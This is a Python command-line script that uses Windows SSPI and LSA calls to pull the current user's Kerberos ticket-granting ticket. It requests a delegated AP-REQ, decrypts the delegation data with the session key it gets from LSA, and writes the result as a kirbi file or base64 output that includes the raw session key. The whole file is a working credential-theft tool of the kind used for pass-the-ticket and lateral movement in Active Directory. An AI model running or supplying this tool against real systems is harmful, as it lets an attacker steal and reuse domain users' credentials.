"""
Extract the current Windows user's Kerberos TGT via SSPI/LSA APIs.

Usage:
    python get_tgt.py
    python get_tgt.py --target cifs/dc.corp.local
    python get_tgt.py -o ticket.kirbi

Dependencies:
    pip install minikerberos asn1crypto
"""
# this tells Python to store type hints as unevaluated strings at definition time, completely solving forward reference issues.
from __future__ import annotations
import base64
import os
# Imports Python's pre-defined C-compatible Windows API types (such as DWORD, HANDLE, BOOL).
import ctypes.wintypes
import sys
# Structure: Base class for defining C-style struct memory layouts in Python.
# POINTER: Factory function to create pointer types (equivalent to T* in C).
# byref: Creates a lightweight pointer reference to pass ctypes objects to C functions efficiently without full pointer instantiation.
# pointer: Instantiates a full ctypes pointer object.
# cast: Casts raw ctypes pointers or memory addresses to different type pointers (like (void*) in C).
# addressof: Returns the memory address of a ctypes object as an integer.
# c_void_p, c_ushort, c_char, c_byte, c_ulong: C-compatible primitive data types representing void*, unsigned short, char, unsigned char/byte, and unsigned long.
# create_string_buffer: Allocates a mutable block of memory (a byte buffer).
# sizeof: Calculates the byte size of a ctypes data type or structure in memory.
# string_at: Reads a specified number of raw bytes from a target memory address.
# WinError: Converts Windows OS error codes into Python-native OSError exceptions.
from ctypes import (
    Structure, POINTER, byref, pointer, cast, addressof,
    c_void_p, c_ushort, c_char, c_byte,
    c_ulong, create_string_buffer, sizeof, string_at, WinError,
)
# HANDLE, LONG: Windows-specific type abstractions for system handles (void*) and signed 32-bit integers (long).
from ctypes.wintypes import HANDLE, LONG
from typing import TypedDict

from asn1crypto import core
from minikerberos.protocol.asn1_structs import AP_REQ, KRB_CRED, EncryptedData, Authenticator, EncKrbCredPart
from minikerberos.protocol.encryption import Key, _enctype_table
from minikerberos.protocol.structures import AuthenticatorChecksum, ChecksumFlags

# Platform Guard: Ensure ctypes Windows definitions fail fast on non-Windows environments
if sys.platform != "win32":
    raise ImportError("This tool is designed for Windows only.")

# ============================================================
#  These lines establish C-style naming conventions mirroring standard Windows SDK headers
# ============================================================
PVOID = c_void_p
PPVOID = POINTER(PVOID)
PHANDLE = POINTER(HANDLE)
NTSTATUS = LONG
PNTSTATUS = POINTER(NTSTATUS)
PULONG = POINTER(c_ulong)
LARGE_INTEGER = ctypes.c_longlong
ULONG = c_ulong
USHORT = c_ushort


# ============================================================
#  LSA structures
# ============================================================

class LUID(Structure):
    """
    Defines a standard Windows Locally Unique Identifier structure.
    """
    _fields_ = [
        ("LowPart", ULONG),
        ("HighPart", LONG)
    ]

    def to_int(self) -> int:
        """Combine HighPart and LowPart into a single 64-bit integer."""
        return (self.HighPart << 32) + self.LowPart

    @staticmethod
    def from_int(i: int) -> LUID:
        """
        Factory method to construct an LUID instance from a 64-bit integer.
        :param i:
        :return:
        """
        l = LUID()
        l.HighPart = i >> 32
        l.LowPart = i & 0xFFFFFFFF
        return l


# creates a module-level alias for a C pointer type that points to an LUID structure.
PLUID = POINTER(LUID)

# In the Windows SDK (ntdef.h), Microsoft defines LSA_STRING (and its alias STRING) to represent length-prefixed
# ANSI/ASCII byte buffers used by Local Security Authority (LSA) APIs:
"""
typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} STRING, *PSTRING, LSA_STRING, *PLSA_STRING;
"""


class LsaString(Structure):
    """
    It defines a C-compatible memory layout for the Windows LSA_STRING structure using Python's ctypes module
    Length:	USHORT (16-bit), The actual byte count of the data stored in Buffer (excluding any trailing null character).
    MaximumLength: USHORT (16-bit), The total memory allocated for Buffer in bytes.
    Buffer: POINTER(c_char), A pointer to a C character array (char*) holding the raw bytes in memory.
    """
    _fields_ = [("Length", USHORT), ("MaximumLength", USHORT), ("Buffer", POINTER(c_char))]


# creates a module-level alias for a C pointer type that points to a LsaString.
PLsaString = POINTER(LsaString)


class LsaUnicodeString(Structure):
    """
    Represents the native Windows LSA_UNICODE_STRING / UNICODE_STRING structure.

        In the Windows API, UNICODE_STRING manages length-prefixed UTF-16-LE strings.
        Crucially, both `Length` and `MaximumLength` are measured in **bytes**,
        not character counts.
    """
    _fields_ = [("Length", USHORT), ("MaximumLength", USHORT), ("Buffer", POINTER(c_char))]

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        # Anchor underlying buffer memory to prevent Python's Garbage Collector
        # from freeing the C memory while Windows native APIs hold the pointer.
        self._keep_alive: ctypes.Array[c_char] | None = None

    @staticmethod
    def from_string(s: str):
        """
        Factory method to construct an LsaUnicodeString from a Python string.
        :param s: The Python string to convert into a UTF-16-LE byte buffer.
        :return: An instance of LsaUnicodeString containing a pointer to the UTF-16-LE encoded buffer.
        """
        # Encode string to UTF-16-LE (without byte order mark)
        enc = s.encode("utf-16-le")
        lus = LsaUnicodeString()
        buf = create_string_buffer(enc, len(enc))
        lus.Buffer = cast(buf, POINTER(c_char))
        lus.MaximumLength = len(enc) + 1
        # 'Length' is byte count EXCLUDING the null terminator
        lus.Length = len(enc)
        return lus

    def to_string(self):
        """
        Decode the underlying UTF-16-LE C buffer into a native Python string.
        :return: The decoded string, or an empty string if the Buffer is NULL or Length is 0.
        """
        return string_at(self.Buffer, self.MaximumLength).decode("utf-16-le", errors="replace").rstrip("\x00")


class KerbCryptoKeyDict(TypedDict):
    """Type definition for the dictionary representation of a KerbCryptoKey."""
    KeyType: int
    Key: bytes


class KerbCryptoKey(Structure):
    """
    Represents the native Windows KERB_CRYPTO_KEY structure (ntsecapi.h).

    Used by Local Security Authority (LSA) APIs to return cryptographic key material
    (such as Kerberos session keys) along with their encryption algorithm ID (etype).
    """
    _fields_ = [
        ("KeyType", LONG),
        ("Length", ULONG),
        ("Value", PVOID)
    ]

    @property
    def key_bytes(self) -> bytes:
        """
        Safely extract raw cryptographic key bytes from the Value pointer.
        :return: Raw binary key material, or b"" if Value is NULL or Length is 0.
        """
        # Guard against NULL pointer dereferences or zero-length allocations
        if not self.Value or self.Length == 0:
            return b""
        return string_at(self.Value, self.Length)

    def to_dict(self) -> KerbCryptoKeyDict:
        """
        Export key metadata and raw key material to a typed dictionary.
        :return: KerbCryptoKeyDict: A dictionary containing 'KeyType' (int) and 'Key' (bytes).
        """
        return {
            "KeyType": int(self.KeyType),
            "Key": self.key_bytes,
        }


class KERB_EXTERNAL_TICKET(Structure):
    _fields_ = [
        ("ServiceName", PVOID),
        ("TargetName", PVOID),
        ("ClientName", PVOID),
        ("DomainName", LsaUnicodeString),
        ("TargetDomainName", LsaUnicodeString),
        ("AltTargetDomainName", LsaUnicodeString),
        ("SessionKey", KerbCryptoKey),
        ("TicketFlags", ULONG),
        ("Flags", ULONG),
        ("KeyExpirationTime", LARGE_INTEGER),
        ("StartTime", LARGE_INTEGER),
        ("EndTime", LARGE_INTEGER),
        ("RenewUntil", LARGE_INTEGER),
        ("TimeSkew", LARGE_INTEGER),
        ("EncodedTicketSize", ULONG),
        ("EncodedTicket", PVOID),
    ]

    def get_data(self):
        return {"Key": self.SessionKey.to_dict(), "Ticket": string_at(self.EncodedTicket, self.EncodedTicketSize)}


class KERB_RETRIEVE_TKT_RESPONSE(Structure):
    _fields_ = [("Ticket", KERB_EXTERNAL_TICKET)]


# ============================================================
#  SSPI structures
# ============================================================

class SecHandle(Structure):
    _fields_ = [("dwLower", POINTER(ULONG)), ("dwUpper", POINTER(ULONG))]

    def __init__(self):
        super().__init__(pointer(ULONG()), pointer(ULONG()))


CredHandle = SecHandle
PCredHandle = POINTER(CredHandle)
CtxtHandle = SecHandle
PCtxtHandle = POINTER(CtxtHandle)


class TimeStamp(Structure):
    _fields_ = [("dwLowDateTime", ULONG), ("dwHighDateTime", ULONG)]


PTimeStamp = POINTER(TimeStamp)


class SecBuffer(Structure):
    _fields_ = [("cbBuffer", ULONG), ("BufferType", ULONG), ("pvBuffer", PVOID)]

    def __init__(self, token=None, buffer_type=2):
        if token is None:
            token = b"\x00" * 2880
        self._buf = create_string_buffer(token, len(token))  # keep ref alive!
        super().__init__(sizeof(self._buf), buffer_type, cast(self._buf, PVOID))

    @property
    def Buffer(self):
        return (self.BufferType, string_at(self.pvBuffer, self.cbBuffer))


class SecBufferDesc(Structure):
    _fields_ = [("ulVersion", ULONG), ("cBuffers", ULONG), ("pBuffers", POINTER(SecBuffer))]

    def __init__(self, sb=None):
        if sb is not None:
            # keep elements alive via a slice copy
            arr = (SecBuffer * len(sb))(*sb)
            self._buf = arr  # keep ref
            super().__init__(0, len(sb), arr)
        else:
            self._buf = SecBuffer()
            super().__init__(0, 1, pointer(self._buf))

    @property
    def Buffers(self):
        return [self.pBuffers[i].Buffer for i in range(self.cBuffers)]


PSecBufferDesc = POINTER(SecBufferDesc)

# ============================================================
#  Constants
# ============================================================
KerbRetrieveEncodedTicketMessage = 8

SEC_E_OK = 0x00000000
SEC_E_CONTINUE_NEEDED = 0x00090312

SECPKG_CRED_OUTBOUND = 2

ISC_REQ_DELEGATE = 0x00000001
ISC_REQ_MUTUAL_AUTH = 0x00000002
ISC_REQ_ALLOCATE_MEMORY = 0x00000100

# ============================================================
#  WinAPI — LSA
# ============================================================

# dynamically loads Windows' native Secur32.dll system library into Python's process memory space.
#
# This line grants Python direct access to lower-level Windows Security APIs, such as the SSPI (Security Support Provider Interface)
# and LSA (Local Security Authority) functions.
secur32 = ctypes.windll.Secur32


def _check_nt(result, func, args):
    if result != 0:
        raise WinError(result)
    return result


def LsaConnectUntrusted():
    f = secur32.LsaConnectUntrusted
    f.argtypes = [PHANDLE]
    f.restype = NTSTATUS
    f.errcheck = _check_nt
    h = HANDLE(-1)
    f(byref(h))
    return h


def LsaDeregisterLogonProcess(h):
    f = secur32.LsaDeregisterLogonProcess
    f.argtypes = [HANDLE]
    f.restype = NTSTATUS
    f.errcheck = _check_nt
    f(h)


def LsaFreeReturnBuffer(p):
    f = secur32.LsaFreeReturnBuffer
    f.argtypes = [PVOID]
    f.restype = NTSTATUS
    f.errcheck = _check_nt
    f(p)


def LsaLookupAuthenticationPackage(h, pkg):
    f = secur32.LsaLookupAuthenticationPackage
    f.argtypes = [HANDLE, PLsaString, PULONG]
    f.restype = NTSTATUS
    f.errcheck = _check_nt

    b = pkg.encode() if isinstance(pkg, str) else pkg
    s = LsaString()
    s.Buffer = create_string_buffer(b)
    s.Length = len(b)
    s.MaximumLength = len(b) + 1
    pid = ULONG(0)
    f(h, byref(s), byref(pid))
    return pid.value


def LsaCallAuthenticationPackage(lsa_handle, pkg_id, msg):
    """
    Returns (response_bytes, free_ptr, ret_status).
    Caller must LsaFreeReturnBuffer(free_ptr) once response parsing is done.
    """
    f = secur32.LsaCallAuthenticationPackage
    f.argtypes = [HANDLE, ULONG, PVOID, ULONG, PPVOID, PULONG, PNTSTATUS]
    f.restype = ULONG
    f.errcheck = _check_nt

    msg_len = sizeof(msg) if isinstance(msg, Structure) else len(msg) if isinstance(msg, bytes) else 0

    ret_p = PVOID()
    ret_len = ULONG(0)
    ret_st = LONG(-1)
    f(lsa_handle, pkg_id, byref(msg), msg_len, byref(ret_p), byref(ret_len), byref(ret_st))

    if ret_st.value != 0:
        raise WinError(ret_st.value)

    if ret_len.value > 0:
        return string_at(ret_p, ret_len.value), ret_p, ret_st.value
    return b"", None, ret_st.value


# ============================================================
#  WinAPI — SSPI
# ============================================================

def _check_sec(result, func, args):
    if result in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
        return result
    raise RuntimeError(f"SSPI call failed: {result:#x}")


def AcquireCredentialsHandle(pkg_name, cred_usage):
    f = secur32.AcquireCredentialsHandleA
    f.argtypes = [POINTER(c_char), POINTER(c_char), ULONG, PLUID, PVOID, PVOID, PVOID, PCredHandle, PTimeStamp]
    f.restype = ULONG
    f.errcheck = _check_sec

    pn = create_string_buffer(pkg_name.encode("ascii"))
    creds = CredHandle()
    ts = TimeStamp()
    f(None, pn, cred_usage, None, None, None, None, byref(creds), byref(ts))
    return creds


def InitializeSecurityContext(creds, spn, flags, ctx_in=None, token=None):
    f = secur32.InitializeSecurityContextA
    f.argtypes = [PCredHandle, PCtxtHandle, POINTER(c_char), ULONG, ULONG, ULONG,
                  PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp]
    f.restype = ULONG
    f.errcheck = _check_sec

    pspn = create_string_buffer(spn.encode("ascii"))
    outbuf = SecBufferDesc()
    outflags = ULONG()
    expiry = TimeStamp()
    ctx_out = CtxtHandle()

    if token is not None:
        inbuf = SecBufferDesc([SecBuffer(token)])
        inbuf_ptr = byref(inbuf)
    else:
        inbuf_ptr = None

    if ctx_in is None:
        res = f(byref(creds), None, pspn, flags, 0, 0, inbuf_ptr, 0,
                byref(ctx_out), byref(outbuf), byref(outflags), byref(expiry))
    else:
        res = f(byref(creds), byref(ctx_in), pspn, flags, 0, 0, inbuf_ptr, 0,
                byref(ctx_out), byref(outbuf), byref(outflags), byref(expiry))

    return res, ctx_out, outbuf.Buffers


# ============================================================
#  Build KerbRetrieveEncodedTicketMessage
# ============================================================

def _build_retrieve_request(target, luid=0):
    if isinstance(luid, int):
        luid = LUID.from_int(luid)

    target_enc = target.encode("utf-16-le") + b"\x00\x00"
    target_alloc = len(target_enc)

    class _REQ(Structure):
        _fields_ = [
            ("MessageType", ULONG),
            ("LogonId", LUID),
            ("TargetName", LsaUnicodeString),
            ("TicketFlags", ULONG),
            ("CacheOptions", ULONG),
            ("EncryptionType", LONG),
            ("CredentialsHandle", PVOID),
            ("_pad", PVOID),
            ("TargetNameData", c_byte * target_alloc),
        ]

    req = _REQ()
    req.MessageType = KerbRetrieveEncodedTicketMessage
    req.LogonId = luid
    req.TicketFlags = 0
    req.CacheOptions = 8
    req.EncryptionType = 0
    req.CredentialsHandle = None
    req.TargetNameData = (c_byte * target_alloc)(*target_enc)

    # Point LsaUnicodeString.Buffer to the trailing name bytes
    struct_end = addressof(req) + sizeof(req)
    name_start = struct_end - target_alloc
    name_start_aligned = name_start - (name_start % sizeof(c_void_p))

    lsa_target = LsaUnicodeString()
    lsa_target.Length = len(target.encode("utf-16-le"))
    lsa_target.MaximumLength = target_alloc
    lsa_target.Buffer = cast(name_start_aligned, POINTER(c_char))
    req.TargetName = lsa_target
    return req


# ============================================================
#  Extract ticket + session key from LSA
# ============================================================

def extract_ticket(lsa_handle, pkg_id, luid, target):
    msg = _build_retrieve_request(target, luid)
    ret_msg, free_ptr, ret_status = LsaCallAuthenticationPackage(lsa_handle, pkg_id, msg)
    if ret_status != 0:
        raise WinError(ret_status)
    resp = KERB_RETRIEVE_TKT_RESPONSE.from_buffer_copy(ret_msg)
    ticket_data = resp.Ticket.get_data()
    if free_ptr is not None:
        LsaFreeReturnBuffer(free_ptr)
    return ticket_data


# ============================================================
#  ASN1 — InitialContextToken (RFC 2743)
# ============================================================

class MechType(core.ObjectIdentifier):
    _map = {"1.2.840.113554.1.2.2": "KRB5 - Kerberos 5"}


class InitialContextToken(core.Sequence):
    class_ = 1
    tag = 0
    _fields = [
        ("thisMech", MechType, {"optional": False}),
        ("unk_bool", core.Boolean, {"optional": False}),
        ("innerContextToken", core.Any, {"optional": False}),
    ]
    _oid_pair = ("thisMech", "innerContextToken")
    _oid_specs = {"KRB5 - Kerberos 5": AP_REQ}


# ============================================================
#  Main
# ============================================================

def get_tgt(target=None):
    """
    Returns the TGT as a KRB_CRED (kirbi) bytes object.
    """

    # --- default target ---
    if target is None:
        ls = os.environ.get("LOGONSERVER", "").lstrip("\\")
        if not ls:
            raise RuntimeError("No --target and LOGONSERVER not set.")
        target = f"cifs/{ls}"

    # --- LSA kerberos package ID ---
    lsa = LsaConnectUntrusted()
    try:
        pkg_id = LsaLookupAuthenticationPackage(lsa, "kerberos")
    finally:
        LsaDeregisterLogonProcess(lsa)

    # --- SSPI: get AP-REQ w/ delegation ---
    creds = AcquireCredentialsHandle("kerberos", SECPKG_CRED_OUTBOUND)
    flags = ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY
    res, ctx, bufs = InitializeSecurityContext(creds, target, flags)

    if res not in (SEC_E_OK, SEC_E_CONTINUE_NEEDED):
        raise RuntimeError(f"InitializeSecurityContext failed: {res:#x}")

    raw_token = bufs[0][1]  # ASN1 InitialContextToken containing AP-REQ

    # --- session key via LSA ---
    lsa2 = LsaConnectUntrusted()
    try:
        raw_ticket = extract_ticket(lsa2, pkg_id, 0, target)
    finally:
        LsaDeregisterLogonProcess(lsa2)

    key = Key(raw_ticket["Key"]["KeyType"], raw_ticket["Key"]["Key"])

    # --- parse AP-REQ ---
    ict = InitialContextToken.load(raw_token)
    apreq = AP_REQ(ict.native["innerContextToken"]).native

    # --- decrypt authenticator ---
    cipher = _enctype_table[apreq["authenticator"]["etype"]]
    auth_plain = cipher.decrypt(key, 11, apreq["authenticator"]["cipher"])
    authenticator = Authenticator.load(auth_plain).native

    # --- delegation checksum ---
    ck = authenticator["cksum"]
    if ck["cksumtype"] != 0x8003:
        raise RuntimeError(f"Unexpected checksum type: {ck['cksumtype']:#x}")

    cdata = AuthenticatorChecksum.from_bytes(ck["checksum"])
    if ChecksumFlags.GSS_C_DELEG_FLAG not in cdata.flags:
        raise RuntimeError("GSS_C_DELEG_FLAG not set -- no delegated TGT")

    # --- decrypt KRB_CRED ---
    cred_native = KRB_CRED.load(cdata.delegation_data).native
    cred_plain = cipher.decrypt(key, 14, cred_native["enc-part"]["cipher"])

    cred_native["enc-part"] = EncryptedData({"etype": 0, "cipher": cred_plain})
    return KRB_CRED(cred_native).dump()


# ============================================================
#  CLI
# ============================================================

def _print_ticket_info(raw_ticket):
    from minikerberos.protocol.asn1_structs import KRB_CRED as _KC
    tkt = _KC.load(raw_ticket["Ticket"]).native
    realm = (
        tkt.get("realm", b"").decode() if isinstance(tkt.get("realm"), bytes)
        else str(tkt.get("realm", ""))
    )
    sname = tkt.get("sname", {})
    parts = [s.decode() if isinstance(s, bytes) else str(s) for s in sname.get("name-string", [])]
    print(f"[+] Ticket for: {'/'.join(parts)}@{realm}")
    print(f"[+] Session key: {raw_ticket['Key']['KeyType']} / {raw_ticket['Key']['Key'].hex()[:16]}...")


def main():
    import argparse
    ap = argparse.ArgumentParser(description="Extract current user's Kerberos TGT")
    ap.add_argument("--target", help="SPN (default: cifs\\<LOGONSERVER>)")
    ap.add_argument("-o", "--out-file", help="Save TGT as kirbi file")
    ap.add_argument("-v", "--verbose", action="store_true", help="Show ticket metadata")
    args = ap.parse_args()

    raw_ticket = []

    def _cb(t):
        raw_ticket.append(t)

    kirbi = get_tgt(args.target)

    # Re-fetch metadata for verbose (cheap since cached in LSA)
    if args.verbose:
        lsa = LsaConnectUntrusted()
        try:
            pkg_id = LsaLookupAuthenticationPackage(lsa, "kerberos")
            t = extract_ticket(lsa, pkg_id, 0, args.target or os.environ.get("LOGONSERVER", "").lstrip("\\"))
            _print_ticket_info(t)
        finally:
            LsaDeregisterLogonProcess(lsa)

    if args.out_file:
        with open(args.out_file, "wb") as f:
            f.write(kirbi)
        print(f"[+] Wrote TGT ({len(kirbi)} bytes) to {args.out_file}")
        return

    # Print details to stdout
    from minikerberos.protocol.asn1_structs import KRB_CRED
    k = KRB_CRED.load(kirbi).native
    for ticket in k.get("tickets", []):
        realm = ticket.get("realm", b"").decode() if isinstance(ticket.get("realm"), bytes) else str(
            ticket.get("realm", ""))
        sname = ticket.get("sname", {})
        parts = [s.decode() if isinstance(s, bytes) else str(s) for s in sname.get("name-string", [])]
        print(f"  SPN:    {'/'.join(parts)}")
        print(f"  Realm:  {realm}")

    if k.get("enc-part", {}).get("etype") == 0:
        cred = EncKrbCredPart.load(k["enc-part"]["cipher"]).native
        for info in cred.get("ticket-info", []):
            key = info.get("key", {})
            keytype = key.get("keytype", "?")
            keyvalue = base64.b64encode(key.get("keyvalue", b"")).decode()
            flags = info.get("flags", [])
            print(f"  Client:   {'/'.join(info.get('pname', {}).get('name-string', []))}")
            print(f"  Realm:    {info.get('prealm', '')}")
            print(f"  Start:    {info.get('starttime', '?')}")
            print(f"  End:      {info.get('endtime', '?')}")
            print(f"  Renew:    {info.get('renew-till', '?')}")
            print(f"  Flags:    {', '.join(flags) if flags else '?'}")
            print(f"  KeyType:  {keytype}")
            print(f"  Key:      {keyvalue}")
    print(f"  KirbiB64: {base64.b64encode(kirbi).decode()}")


if __name__ == "__main__":
    main()
